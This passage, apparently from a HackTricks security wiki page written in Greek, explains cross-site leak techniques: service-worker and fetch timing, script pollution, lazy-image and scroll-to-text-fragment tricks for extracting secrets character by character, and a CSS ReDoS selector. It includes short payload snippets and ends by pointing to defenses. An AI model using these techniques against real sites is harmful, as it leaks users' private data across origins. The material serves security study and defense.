Χρησιμοποιήστε _**fetch**_ και _**setTimeout**_ με έναν **AbortController** για να ανιχνεύσετε αν ο **πόρος είναι αποθηκευμένος στην cache** και για να απομακρύνετε έναν συγκεκριμένο πόρο από την cache του περιηγητή. Επιπλέον, η διαδικασία συμβαίνει χωρίς την αποθήκευση νέου περιεχομένου.

### Script Pollution

- **Inclusion Methods**: HTML Elements (script)
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **Summary:** Είναι δυνατόν να **επικαλύψετε τις ενσωματωμένες συναρτήσεις** και να διαβάσετε τα επιχειρήματά τους, ακόμη και από **cross-origin script** (το οποίο δεν μπορεί να διαβαστεί άμεσα), αυτό μπορεί να **διαρρεύσει πολύτιμες πληροφορίες**.
- **Code Example**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Service Workers <a href="#service-workers" id="service-workers"></a>

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Page Content
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **Summary:** Μετρήστε τον χρόνο εκτέλεσης ενός ιστότοπου χρησιμοποιώντας service workers.
- **Code Example**:

Στο δεδομένο σενάριο, ο επιτιθέμενος αναλαμβάνει την πρωτοβουλία να καταχωρήσει έναν **service worker** σε μία από τις τοποθεσίες τους, συγκεκριμένα "attacker.com". Στη συνέχεια, ο επιτιθέμενος ανοίγει ένα νέο παράθυρο στην στοχευμένη ιστοσελίδα από το κύριο έγγραφο και δίνει εντολή στον **service worker** να ξεκινήσει ένα χρονοδιακόπτη. Καθώς το νέο παράθυρο αρχίζει να φορτώνει, ο επιτιθέμενος πλοηγεί την αναφορά που αποκτήθηκε στο προηγούμενο βήμα σε μια σελίδα που διαχειρίζεται ο **service worker**.

Κατά την άφιξη του αιτήματος που ξεκίνησε στο προηγούμενο βήμα, ο **service worker** απαντά με έναν κωδικό κατάστασης **204 (No Content)**, τερματίζοντας αποτελεσματικά τη διαδικασία πλοήγησης. Σε αυτό το σημείο, ο **service worker** καταγράφει μια μέτρηση από τον χρονοδιακόπτη που ξεκίνησε νωρίτερα στο βήμα δύο. Αυτή η μέτρηση επηρεάζεται από τη διάρκεια του JavaScript που προκαλεί καθυστερήσεις στη διαδικασία πλοήγησης.

> [!WARNING]
> Σε μια εκτέλεση χρονομέτρησης είναι δυνατόν να **εξαλείψετε** **παράγοντες δικτύου** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν τη φορτώσετε.

### Fetch Timing

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **Summary:** Χρησιμοποιήστε [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που απαιτείται για να εκτελέσετε ένα αίτημα. Άλλοι χρονομετρητές θα μπορούσαν να χρησιμοποιηθούν.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Timing (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **Summary:** Χρησιμοποιήστε [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που απαιτείται για να εκτελέσετε ένα αίτημα χρησιμοποιώντας `window.open`. Άλλοι χρονομετρητές θα μπορούσαν να χρησιμοποιηθούν.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

## With HTML or Re Injection

Εδώ μπορείτε να βρείτε τεχνικές για να εξάγετε πληροφορίες από ένα cross-origin HTML **εισάγοντας περιεχόμενο HTML**. Αυτές οι τεχνικές είναι ενδιαφέρουσες σε περιπτώσεις όπου για οποιονδήποτε λόγο μπορείτε να **εισάγετε HTML αλλά δεν μπορείτε να εισάγετε κώδικα JS**.

### Dangling Markup

{{#ref}}
dangling-markup-html-scriptless-injection/
{{#endref}}

### Image Lazy Loading

Αν χρειάζεστε να **εξάγετε περιεχόμενο** και μπορείτε να **προσθέσετε HTML πριν από το μυστικό**, θα πρέπει να ελέγξετε τις **κοινές τεχνικές κρεμασμένου markup**.\
Ωστόσο, αν για οποιονδήποτε λόγο **ΠΡΕΠΕΙ** να το κάνετε **χαρακτήρα προς χαρακτήρα** (ίσως η επικοινωνία είναι μέσω ενός cache hit), μπορείτε να χρησιμοποιήσετε αυτό το κόλπο.

**Εικόνες** στο HTML έχουν μια ιδιότητα "**loading**" της οποίας η τιμή μπορεί να είναι "**lazy**". Σε αυτή την περίπτωση, η εικόνα θα φορτωθεί όταν την δει κάποιος και όχι ενώ η σελίδα φορτώνει:
```html
<img src=/something loading=lazy >
```
Λοιπόν, αυτό που μπορείτε να κάνετε είναι να **προσθέσετε πολλούς άχρηστους χαρακτήρες** (Για παράδειγμα **χιλιάδες "W"**) για να **γεμίσετε τη σελίδα πριν από το μυστικό ή να προσθέσετε κάτι όπως** `<br><canvas height="1850px"></canvas><br>.`\
Έπειτα, αν για παράδειγμα η **ένεση μας εμφανιστεί πριν από τη σημαία**, η **εικόνα** θα **φορτωθεί**, αλλά αν εμφανιστεί **μετά** τη **σημαία**, η σημαία + οι άχρηστοι χαρακτήρες θα **εμποδίσουν τη φόρτωσή της** (θα χρειαστεί να πειραματιστείτε με το πόσους άχρηστους χαρακτήρες να τοποθετήσετε). Αυτό συνέβη σε [**αυτή την ανάρτηση**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Μια άλλη επιλογή θα ήταν να χρησιμοποιήσετε το **scroll-to-text-fragment** αν επιτρέπεται:

#### Scroll-to-text-fragment

Ωστόσο, κάνετε το **ρομπότ να έχει πρόσβαση στη σελίδα** με κάτι όπως
```
#:~:text=SECR
```
Έτσι, η ιστοσελίδα θα είναι κάτι σαν: **`https://victim.com/post.html#:~:text=SECR`**

Όπου το post.html περιέχει τους χαρακτήρες junk του επιτιθέμενου και την εικόνα lazy load και στη συνέχεια προστίθεται το μυστικό του bot.

Αυτό το κείμενο θα κάνει το bot να έχει πρόσβαση σε οποιοδήποτε κείμενο στη σελίδα που περιέχει το κείμενο `SECR`. Δεδομένου ότι αυτό το κείμενο είναι το μυστικό και είναι ακριβώς **κάτω από την εικόνα**, η **εικόνα θα φορτωθεί μόνο αν το μαντέψιμο μυστικό είναι σωστό**. Έτσι, έχετε τον ορατό σας για να **εξάγετε το μυστικό χαρακτήρα προς χαρακτήρα**.

Μερικά παραδείγματα κώδικα για να εκμεταλλευτείτε αυτό: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Χρόνος Φόρτωσης Εικόνας Lazy Based

Αν **δεν είναι δυνατή η φόρτωση μιας εξωτερικής εικόνας** που θα μπορούσε να υποδείξει στον επιτιθέμενο ότι η εικόνα έχει φορτωθεί, μια άλλη επιλογή θα ήταν να προσπαθήσετε να **μαντέψετε τον χαρακτήρα πολλές φορές και να το μετρήσετε**. Αν η εικόνα φορτωθεί, όλα τα αιτήματα θα διαρκέσουν περισσότερο από ότι αν η εικόνα δεν φορτωθεί. Αυτό χρησιμοποιήθηκε στην [**λύση αυτού του writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **που συνοψίζεται εδώ:**

{{#ref}}
xs-search/event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS

{{#ref}}
regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

Αν χρησιμοποιηθεί το `jQuery(location.hash)`, είναι δυνατόν να διαπιστωθεί μέσω του χρόνου i**f υπάρχει κάποιο HTML περιεχόμενο**, αυτό συμβαίνει επειδή αν ο επιλεγέας `main[id='site-main']` δεν ταιριάζει, δεν χρειάζεται να ελέγξει τους υπόλοιπους **επιλεγείς**:
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### CSS Injection

{{#ref}}
xs-search/css-injection/
{{#endref}}

## Defenses

Υπάρχουν προτάσεις μετριασμού που συνιστώνται στο [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) καθώς και σε κάθε ενότητα του wiki [https://xsleaks.dev/](https://xsleaks.dev/). Ρίξτε μια ματιά εκεί για περισσότερες πληροφορίες σχετικά με το πώς να προστατευθείτε από αυτές τις τεχνικές.

## References

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{{#include ../banners/hacktricks-training.md}}
